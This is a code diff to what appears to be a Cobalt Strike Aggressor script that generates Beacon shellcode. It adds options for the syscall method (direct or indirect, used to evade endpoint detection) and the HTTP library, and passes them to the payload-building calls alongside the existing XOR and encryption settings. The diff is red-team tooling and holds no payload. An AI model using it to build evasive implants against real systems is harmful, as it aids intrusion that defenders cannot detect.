@@ -50,6 +50,8 @@ sub generate_shellcode {
 	drow_listener_stage($dialog, "listener", "Listener: ");
 	drow_combobox($dialog, "payload_type", "Delivery: ", @("Stageless","Staged"));
 	drow_combobox($dialog, "exit_method", "Exit Method: ", @("process", "thread"));
+	drow_combobox($dialog, "syscalls_type", "Beacon Syscalls Method: ", @("none","direct","indirect"));
+	drow_combobox($dialog, "http_type", "Beacon HTTP Library: ", @("wininet","winhttp"));
 	drow_checkbox($dialog, "local", "Local Pointers: ", "Embeded Pointers from an Existing Session");
 	drow_beacon($dialog, "bid", "Existing Session: ");
 	drow_checkbox($dialog, "x86", "x86: ", "Use x86 Shellcode");
@@ -74,7 +76,7 @@ sub shellcode_gen {
 	#debug(debug() | 64);
 
 	# Assign menu selections to variables used in shellcode build
-	$exit_method = $3['exit_method'];
+	#$exit_method = $3['exit_method'];
 	$xorkey = $3['xor_key'];
 	$enckey = $3['encryption_key'];
 	$linelength = $3['line_length'];
@@ -112,19 +114,25 @@ sub shellcode_gen {
 
 		# Create beacon shellcode with local session pointers, listener, architecture, and exit method
 			else if ($3['local'] eq "true") {
-				$shellcode = payload_local($3['bid'], $3['listener'], $arch, $exit_method);
-				println("Embedding pointers from Beacon ID: " . $3['bid']);
+				$shellcode = payload_local($3['bid'], $3['listener'], $arch, $3['exit_method'], $3['syscalls_type'], $3['http_type']);
+				println("CSSG generating Beacon shellocode");
 				println("Listener: " . $3['listener']);
+				println("Embedding pointers from Beacon ID: " . $3['bid']);
 				println("Architecture: " . $arch);
 				println("Exit Method: " . $exit_method);
+				println("Syscalls: " . $3['syscalls_type']);
+				println("HTTP Library: " . $3['http_type']);
 			}
 		
 		# else Create the beacon shellcode with listener, architecture, and exit method
 			else {
-				$shellcode = payload($3['listener'], $arch, $exit_method);
+				$shellcode = payload($3['listener'], $arch, $3['exit_method'], $3['syscalls_type'], $3['http_type']);
+				println("CSSG generating Beacon shellocode");
 				println("Listener: " . $3['listener']);
 				println("Architecture: " . $arch);
 				println("Exit Method: " . $exit_method);
+				println("Syscalls: " . $3['syscalls_type']);
+				println("HTTP Library: " . $3['http_type']);
 			}
 
 		# Get raw shellcode size in bytes
